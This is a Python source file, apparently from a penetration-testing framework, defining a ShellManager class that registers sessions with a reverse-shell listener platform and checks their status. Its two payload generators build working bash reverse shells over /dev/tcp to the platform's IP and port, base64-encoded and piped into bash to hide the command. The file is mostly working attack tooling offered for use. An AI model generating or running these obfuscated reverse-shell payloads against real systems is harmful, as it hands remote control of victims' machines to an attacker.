from xing.utils import http_req, get_logger
from random import randint
import json
from xing.conf import Conf
from base64 import b64encode


class ShellManager:
    def __init__(self):
        self.logger = get_logger()
        self.platform_ip = Conf.SHELL_PLATFORM_IP
        self.platform_port = Conf.SHELL_PLATFORM_PORT
        self.platform_url = f'http://{self.platform_ip}:{self.platform_port}'
        self.uuid = None
        self.reverse_port = None
        self.conn_url = None

    def check_service(self):
        req = http_req(self.platform_url)
        if req.status_code == 200:
            return True

        else:
            return False

    def create_session(self):
        count = 20
        while count >= 0:
            port = randint(10000, 50000)
            data = {
                'port': port
            }

            self.logger.debug("Session Created For Port {}".format(port))

            url = self.platform_url + '/create'
            req = http_req(url, method='post', data=data)
            if req.status_code == 302:
                self.conn_url = req.headers.get('Location')
                self.logger.info(f'Session Created For Port {port} At: {self.conn_url}')
                uuid = self.conn_url.split('/')[-1]
                self.reverse_port = port
                self.uuid = uuid
                break

            count -= 1

        if count <= 0:
            self.logger.error('Unable To Find Available Port')
            exit()

    def check_port(self):
        url = self.platform_url + '/check'
        req = http_req(url, method='post')
        if req.status_code == 200:
            if b'ports' in req.content:
                ports = json.loads(req.content)['ports']
                return ports

        return req.status_code

    def generate_payload1(self):
        reverse_shell_payload = f'''bash -i 5<> /dev/tcp/{self.platform_ip}/{self.reverse_port} 0<&5 1>&5 2>&5'''
        b64_payload = b64encode(reverse_shell_payload.encode()).decode()
        payload = '''bash -c {echo,%s}|{base64,-d}|bash ''' % b64_payload
        self.logger.debug(f'Generated Reverse Shell Payload: {payload}')
        return payload

    def generate_payload2(self):
        reverse_shell_payload = f'''bash -i 5<> /dev/tcp/{self.platform_ip}/{self.reverse_port} 0<&5 1>&5 2>&5'''
        b64_payload = b64encode(reverse_shell_payload.encode()).decode()
        payload = '''echo %s|base64 -d|bash''' % b64_payload
        self.logger.debug(f'Generated Reverse Shell Payload: {payload}')
        return payload

    def check_connection(self):
        url = self.platform_url + '/status/' + self.uuid
        data = http_req(url).json()
        self.logger.debug(f'Connection Status For UUID {self.uuid}: {data["status"]}')
        return data["status"]

